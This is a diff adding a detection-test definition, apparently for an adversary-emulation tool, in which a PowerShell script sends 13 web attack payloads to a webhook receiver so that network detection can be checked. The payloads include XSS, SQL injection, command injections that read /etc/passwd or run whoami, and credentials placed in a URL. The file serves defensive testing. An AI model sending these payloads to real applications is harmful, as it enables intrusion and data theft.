@@ -1,0 +1,81 @@
+---
+- id: scn012-a1-web-app-attacks
+  name: "SCN-012 | NDR: Web Application Attacks"
+  description: |
+    Sends a series of web application attack payloads via HTTP including
+    Cross-Site Scripting (XSS), SQL Injection (SQLi), Remote Code Execution (RCE),
+    and cleartext credential leaks. Tests NDR detection of malicious HTTP payloads.
+
+    MITRE ATT&CK: T1190 - Exploit Public-Facing Application
+    NDR Detection: Flow Risk 1 (XSS), Flow Risk 2 (SQLi), Flow Risk 3 (RCE), Flow Risk 26 (Credential Leak)
+
+    Uses curl.exe (built into Windows 10+) to send URL-encoded attack payloads.
+    Target: webhook.site endpoint (safe receiver — NDR detects the payload content in transit).
+
+    What to watch for:
+    - NDR alerts for XSS, SQL injection, command injection patterns in HTTP traffic
+    - Cleartext credentials detected in URL parameters
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: "Exploit Public-Facing Application"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== WEB APPLICATION ATTACK SIMULATION (T1190) ===";
+          $WEBHOOK = "http://webhook.site/NDR_TEST";
+          $delay = 2;
+          Write-Output "[*] Target: $WEBHOOK";
+          Write-Output "";
+          Write-Output "--- XSS Attacks (Flow Risk 1) ---";
+          Write-Output "[*] Test 1: Script tag XSS in URL param";
+          curl.exe -X GET "${WEBHOOK}?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 2: Img onerror XSS";
+          curl.exe -X GET "${WEBHOOK}?html=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 3: H1 tag injection";
+          curl.exe -X GET "${WEBHOOK}?title=%3Ch1%3EXSS%20Test%3C%2Fh1%3E" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 4: XSS in POST form data";
+          curl.exe -X POST -d "comment=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E" -H "Content-Type: application/x-www-form-urlencoded" "$WEBHOOK" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 5: XSS in User-Agent header";
+          curl.exe -X GET -H "User-Agent: Mozilla/5.0 (XSS-Agent)%3Cscript%3Ealert%28%27UAXSS%27%29%3C%2Fscript%3E" "$WEBHOOK" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "";
+          Write-Output "--- SQL Injection (Flow Risk 2) ---";
+          Write-Output "[*] Test 6: UNION SELECT SQLi";
+          curl.exe -X GET "${WEBHOOK}?id=%3Fid%3Da%27+UNION+SELECT+%22text1%22%2C%22text2%22%3B--+-%26Submit%3DSubmit&Submit%3DSubmit" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "";
+          Write-Output "--- RCE Injection (Flow Risk 3) ---";
+          Write-Output "[*] Test 7: Linux ls command injection";
+          curl.exe -X GET "${WEBHOOK}?cmd=%3bls%20-la" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 8: cat /etc/passwd";
+          curl.exe -X GET "${WEBHOOK}?file=%3bcat%20%2fetc%2fpasswd" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 9: Windows dir injection";
+          curl.exe -X GET "${WEBHOOK}?dir=%7cdir%20C%3a%5c" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 10: Ping command injection (POST)";
+          curl.exe -X POST -d "command=%26%26ping%20-c%204%20127.0.0.1" -H "Content-Type: application/x-www-form-urlencoded" "$WEBHOOK" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 11: PHP eval RCE (JSON body)";
+          curl.exe -X POST -H "Content-Type: application/json" -d "{`"code`":`"eval(system('whoami'));`"}" "$WEBHOOK" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "[*] Test 12: Backtick whoami in Referer header";
+          curl.exe -X GET -H "Referer: http://example.com/search?q=%60whoami%60" "$WEBHOOK" -L -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "";
+          Write-Output "--- Credential Leak (Flow Risk 26) ---";
+          Write-Output "[*] Test 13: Cleartext credentials in URL";
+          curl.exe -L "http://test:5544llll@$($WEBHOOK.Replace('http://',''))/?id=hellothere" -s -o NUL;
+          Start-Sleep -Seconds $delay;
+          Write-Output "";
+          Write-Output "[+] All 13 web application attack payloads sent";
+          Write-Output "[*] NDR should flag: Flow Risk 1 (XSS), 2 (SQLi), 3 (RCE), 26 (Credential Leak)";
+          Write-Output "=== END WEB APP ATTACKS ==="
+        cleanup: ""
